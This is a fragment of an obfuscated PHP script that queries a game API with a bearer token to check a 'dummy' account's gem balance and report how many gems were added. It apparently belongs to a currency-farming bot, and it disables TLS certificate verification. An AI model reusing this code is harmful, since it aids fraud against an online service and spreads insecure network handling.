    curl_setopt($var_463ff47f91f27f78a5b0d599cb8ca404, CURLOPT_URL, $urlbal2);
    curl_setopt($var_463ff47f91f27f78a5b0d599cb8ca404, CURLOPT_RETURNTRANSFER, true);
    $var_1bd6d80891821e1252d9cea753517c1a = array("authorization: Bearer $bearer",);
    curl_setopt($var_463ff47f91f27f78a5b0d599cb8ca404, CURLOPT_HTTPHEADER, $var_1bd6d80891821e1252d9cea753517c1a);
        curl_setopt($var_463ff47f91f27f78a5b0d599cb8ca404, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($var_463ff47f91f27f78a5b0d599cb8ca404, CURLOPT_SSL_VERIFYPEER, false);
    $var_ffe7f68e36079e318a4eecce4e07a548 = curl_exec($var_463ff47f91f27f78a5b0d599cb8ca404);
    curl_close($var_463ff47f91f27f78a5b0d599cb8ca404);
        $var_c75756e9f1e69f7740a721f6ae84c469 = json_decode($var_ffe7f68e36079e318a4eecce4e07a548);
    $var_228760d03932a81b8dd987bf2eabb00d = $var_c75756e9f1e69f7740a721f6ae84c469->data->totalGem;
    $var_3c5125ae302a86a0d3480ef3cfe8e7bd = $var_228760d03932a81b8dd987bf2eabb00d - $tg;
    echo "
DUMMY BALANCE $var_228760d03932a81b8dd987bf2eabb00d GEMS

";
    echo "
Added gems to dummy: +$var_3c5125ae302a86a0d3480ef3cfe8e7bd GEMS
";
        
    
    
    echo "🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼🌼";
    $green = "[0;32m";
    echo "$green";
    echo "
";
}